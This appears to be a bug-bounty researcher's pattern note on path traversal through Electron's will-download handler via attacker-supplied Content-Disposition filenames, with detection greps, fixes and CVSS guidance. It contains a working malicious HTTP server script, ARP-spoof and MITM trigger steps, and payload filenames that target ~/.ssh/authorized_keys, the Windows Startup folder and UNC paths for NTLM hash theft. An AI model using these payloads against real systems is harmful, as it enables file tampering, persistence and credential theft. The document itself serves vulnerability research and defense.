---
type: pattern
title: Pattern - Electron will-download Path Traversal (Content-Disposition filename)
tags: [pattern, cwe-22, electron, path-traversal, will-download, content-disposition, desktop-app, bb-pattern]
status: static-confirmed
first_seen: 2026-04-25
last_updated: 2026-04-25
severity: P2–P3 (CVSS 6.3–7.8 High, AC:H since requires MITM or attacker-controlled download URL)
precedents: CVE-2018-15685 (Electron downloadURL path traversal), Slack HackerOne #328607 (download path traversal), Rocket.Chat 2020 (will-download no sanitization)
---

# Pattern - Electron will-download Path Traversal

## TL;DR

Electron apps that handle the `will-download` event and construct a save path with `path.join(saveDir, item.getFilename())` are vulnerable to path traversal when a server responds with a `Content-Disposition: attachment; filename="../../malicious"` header. `item.getFilename()` returns the raw filename string from the HTTP header — Electron does **not** sanitize it. An attacker who controls the download URL (via MITM, redirect, or an in-app feature that fetches attacker-supplied content) can write arbitrary file content to any user-writable path outside the intended save directory. Static-confirmed in a case study [Enterprise Messenger] app, `main.beautified.js:14906` (VENDOR-018, CWE-22).

**Honest framing**: this is write-arbitrary-content to user-writable paths, not a direct OS command execution. Impact depends on what can be overwritten — shell startup scripts, application config, auto-loaded plugins, or scheduled task files are common escalation targets.

## Root-cause ingredients

### Ingredient 1: `will-download` handler using raw `item.getFilename()`

```javascript
// ❌ vulnerable — main.beautified.js:14906 ([Enterprise Messenger] VENDOR-018)
app.on("will-download", (event, item, webContents) => {
  const saveDir = app.getPath("downloads");
  // item.getFilename() returns raw Content-Disposition filename — NOT sanitized
  const savePath = path.join(saveDir, item.getFilename());
  item.setSavePath(savePath);
});
```

`path.join` does **not** prevent traversal — it resolves `..` segments:

```javascript
const path = require("path");
path.join("/home/user/Downloads", "../../.bashrc");
// → "/home/user/.bashrc"   ← escaped the intended directory
```

### Ingredient 2: Attacker-controlled `Content-Disposition` header

The attacker's HTTP server responds to any fetch/download triggered from within the app:

```http
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="../../../../Library/Application Support/myapp/config.json"
Content-Type: application/octet-stream
Content-Length: 42

{"admin":true,"debugMode":true,"rpcPort":9229}
```

### Ingredient 3: Reachable download trigger

A trigger in the app that fetches an attacker-controlled URL and allows the `will-download` event to fire:

- Chat attachment download link (in-app renderer clicks `<a href="...">`)
- File sync / update mechanism fetching from a configurable URL
- In-app browser navigation to an attacker page that serves a `Content-Disposition` response
- MITM of any HTTP (non-HTTPS) download the app performs automatically

## Detection methodology

1. **Find all `will-download` handlers**:
   ```bash
   grep -r "will-download\|will_download\|setSavePath\|getFilename" \
     --include="*.js" --include="*.ts" -n .
   ```

2. **Find `path.join` + `getFilename` co-occurrence** (the exact vulnerable pattern):
   ```bash
   grep -A5 -B5 "getFilename" main.js main.beautified.js app.js 2>/dev/null | \
     grep -E "path\.join|setSavePath"
   ```

3. **Check for `path.basename()` sanitization** (the fix):
   ```bash
   grep "path\.basename.*getFilename\|getFilename.*path\.basename" \
     --include="*.js" -rn .
   ```
   If this grep returns 0 results and ingredient 1 matches, the sink is unsanitized.

4. **Find download trigger entry points** — search for what can cause a download event:
   ```bash
   grep -rn "downloadURL\|download.*url\|loadURL.*http\|attachmentUrl\|fileUrl" \
     --include="*.js" -n . | grep -v "node_modules"
   ```

5. **Manual review checklist**:
   - Does `item.setSavePath(...)` use the raw output of `item.getFilename()`?
   - Is there any `path.normalize` + directory-prefix assertion between `getFilename()` and `setSavePath()`?
   - Can a renderer (potentially attacker-controlled) trigger a download from an arbitrary URL?
   - Does the app have auto-download behavior (update checker, asset sync) over HTTP?

## Live verification SOP

### Setup: malicious HTTP server

```python
# attacker_server.py — serves a file with traversal filename
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        payload = b'{"pwned": true}'
        # Adjust traversal depth to match target app's download dir
        filename = "../../.bashrc_injected"
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Disposition",
                         f'attachment; filename="{filename}"')
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)
        print(f"[*] Served traversal payload as: {filename}")

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```

```bash
python3 attacker_server.py
```

### Trigger the download from within the Electron app

Option A — in-app chat/file share sends a link to the attacker server:
1. Share `http://ATTACKER_IP:8080/evil` as a file attachment link in-app
2. Victim clicks the link → Electron fires `will-download` event
3. App calls `item.setSavePath(path.join(saveDir, "../../.bashrc_injected"))`

Option B — MITM HTTP update/asset fetch:
1. ARP spoof or DNS redirect the Electron app's HTTP download endpoint
2. Serve the malicious `Content-Disposition` response
3. Observe file written outside `saveDir`

### Observe the result

```bash
# On victim machine — confirm file written outside Downloads
ls -la ~/         # look for unexpected files at home dir level
ls -la ~/.config/ # or wherever the traversal points

# Compare expected vs actual write location
# Expected: ~/Downloads/evil
# Actual:   ~/.bashrc_injected  (or wherever traversal resolves)
```

**Honest scope boundary**: the attacker can only write to paths the OS user can write to. System directories (`/etc/`, `C:\Windows\`) are not reachable without privilege escalation. Impact is limited to user-writable paths.

## Variants

### Variant A: Classic `../` traversal (Unix)

```
Content-Disposition: attachment; filename="../../.ssh/authorized_keys"
```

Payload: attacker's SSH public key → SSH login as victim. Highest-impact escalation on Unix systems where `~/.ssh/` is user-writable.

### Variant B: Absolute path injection

On Windows, some `path.join` implementations (Node.js pre-v14 behavior, or non-POSIX path) can be overridden by an absolute path in the second argument:

```
Content-Disposition: attachment; filename="C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.bat"
```

Check: `path.join("C:\\Downloads", "C:\\evil.bat")` on Windows → `"C:\\evil.bat"` (absolute path wins). Node.js `path.win32.join` behaves this way — the absolute-path segment discards everything before it.

### Variant C: Windows UNC path

```
Content-Disposition: attachment; filename="\\\\ATTACKER\\share\\poison.lnk"
```

On Windows, if the Electron renderer fetches an SMB-capable download, the UNC path in the filename can be passed to `setSavePath` — triggering an SMB auth attempt (NTLMv2 hash theft) and potentially writing to the UNC share path. Combine with [[Pattern - shell.openExternal UNC RCE]] for full chain.

### Variant D: Null bytes and alternate separators

URL-encoded or null-byte variants to bypass naive string checks:

```
filename="..%2F..%2F.bashrc"       # URL-encoded slash
filename="..\..\.bashrc"           # Windows backslash
filename="foo\x00../../.bashrc"    # null byte (truncates suffix check)
```

Note: `path.join` in Node.js does **not** decode percent-encoding — `%2F` is treated as a literal character, not a slash. However, some apps decode the filename before passing to `path.join`, creating a secondary bypass surface.

## Real-world examples

| Vendor / App | Year | Variant | Sink | Note |
|--------------|------|---------|------|------|
| **[Enterprise Messenger]** (VENDOR-018) | 2026 | A (`../` Unix/Win) | `app.on("will-download") → path.join(saveDir, item.getFilename())` | Static-confirmed `main.beautified.js:14906`; no `path.basename()` call present |
| **Electron** (CVE-2018-15685) | 2018 | A + B | `will-download` + `setSavePath` — upstream framework bug | Electron <= 1.8.2-beta.4, 1.7.12, 1.6.17 affected; fixed by enforcing `path.basename` in framework |
| **Rocket.Chat Desktop** | 2020 | A | `will-download` handler used raw `getFilename()` | Reported via HackerOne; fixed in v3.0.0 by adding `path.basename()` |
| **Slack Desktop** (HackerOne approx. #328607) | 2018 | A | Auto-download of shared files without sanitization | Bounty paid; patched to normalize download paths |

## Defense

```javascript
const path = require("path");
const fs = require("fs");

app.on("will-download", (event, item, webContents) => {
  const saveDir = app.getPath("downloads");

  // ✅ Fix 1: path.basename() strips all directory components
  // "../../.bashrc" → ".bashrc"
  // "/etc/passwd"   → "passwd"
  const safeFilename = path.basename(item.getFilename());

  // ✅ Fix 2: Construct full path and verify it stays inside saveDir
  const savePath = path.join(saveDir, safeFilename);
  const resolvedSavePath = path.resolve(savePath);
  const resolvedSaveDir = path.resolve(saveDir);

  if (!resolvedSavePath.startsWith(resolvedSaveDir + path.sep)) {
    // This should never happen after path.basename(), but defense-in-depth
    event.preventDefault();
    console.error("[security] path traversal attempt blocked:", item.getFilename());
    return;
  }

  // ✅ Fix 3: Optionally allowlist filename characters
  if (!/^[\w\-. ]+$/.test(safeFilename)) {
    // Reject or sanitize further
    item.cancel();
    return;
  }

  item.setSavePath(savePath);
});
```

**Minimum required fix**: replace `item.getFilename()` with `path.basename(item.getFilename())` everywhere `setSavePath` is called. Defense-in-depth adds the `path.resolve` + prefix-assertion check.

**Additional mitigations**:
- Enable Electron's `sandbox: true` in `webPreferences` — limits what a compromised renderer can trigger, but does not fix the main-process `will-download` handler directly
- Serve all downloads over HTTPS to reduce MITM attack surface for Variant A
- Validate `Content-Disposition` filename against an allowlist of safe characters before using it

## Filing & severity

- **CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory / Path Traversal)
- **CVSS base (MITM required)**:
  - `AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:N` → **6.3 Medium**
  - Rationale: AC:H because attacker must control the download URL (MITM or social engineering to click malicious link); I:H for arbitrary user-writable file write; no direct code exec → A:N
- **CVSS base (in-app feature allows arbitrary URL download)**:
  - `AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N` → **6.5 Medium**
  - AC drops to L when no MITM needed — victim just clicks a link shared in-app
- **With escalation chain** (write to startup / SSH authorized_keys → persistence):
  - `AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H` → **7.8 High** (Scope Changed if write enables code exec in a different security context)
- **Impact framing**:
  - ✅ "Attacker-controlled `Content-Disposition` filename causes file to be written outside the intended download directory (static-confirmed; path traversal via `path.join` + unsanitized `item.getFilename()`)"
  - ✅ "Write-only to user-writable paths; escalation to code execution requires overwriting a user-controlled auto-loaded file (e.g., shell profile, app plugin directory)"
  - ❌ "Arbitrary code execution" standalone — this is a write primitive, not a direct exec; chain must be explicit
  - ❌ "Remote code execution" — requires the additional escalation step; must be written conditionally

## Chains

- **Download trigger via custom scheme → traversal write → persistence**: If the app has a custom scheme handler ([[Pattern - Electron Custom Scheme Handler Injection]]) that can initiate a file download from an attacker URL, no MITM is needed — the scheme handler delivers the traversal payload directly. Full chain: `custom://...?downloadUrl=http://attacker/` → `will-download` fires → `path.join(saveDir, "../../.bashrc")` → overwrite shell profile → next login exec.

- **Traversal write + UNC in filename** (Windows): combine Variant C above with [[Pattern - shell.openExternal UNC RCE]] — if the app auto-opens downloaded files with `shell.openExternal`, writing a UNC-path `.lnk` to the Desktop or Startup folder completes a 2-stage takeover.

- **Traversal write + auto-update plugin dir**: some Electron apps load plugins from a user-writable directory at startup. Traversal-writing a `.js` / `.asar` file to that directory achieves persistent code execution at next app launch without any additional user interaction.

## Related

- [[Pattern - Windows UNC Path Primitive]] — meta-pattern: Variant C corresponds to the T3 (file-write) sink, same OS primitive
- [[Pattern - Electron Custom Scheme Handler Injection]] — trigger entrypoint
- [[Pattern - shell.openExternal UNC RCE]] — sibling T1 sink; can chain "traversal write + UNC `.lnk` auto-open"
- [[Pattern - JWT File-based Validation UNC NTLM Oracle]] — sibling T2 sink
- [[Pattern - Electron Preload Injection Chain]]
- Target vendor case study §VENDOR-018
- [[Lessons Learned]] §Firmware vulnerability verification standards / §Bug bounty report anti-exaggeration rules
